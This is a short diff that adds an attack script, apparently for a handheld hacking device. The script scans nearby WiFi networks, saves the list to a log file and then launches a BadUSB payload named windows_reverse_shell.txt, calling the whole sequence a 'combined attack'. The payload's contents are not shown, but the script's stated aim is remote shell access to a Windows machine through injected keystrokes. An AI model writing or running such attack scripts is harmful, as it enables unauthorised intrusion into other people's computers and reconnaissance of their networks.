@@ -1,0 +1,7 @@
+LOG Starting combined attack
+WIFI_SCAN
+DELAY 5000
+WIFI_SAVE_RESULTS /logs/networks.txt
+BADUSB /payloads/windows_reverse_shell.txt
+DELAY 10000
+LOG Attack completed
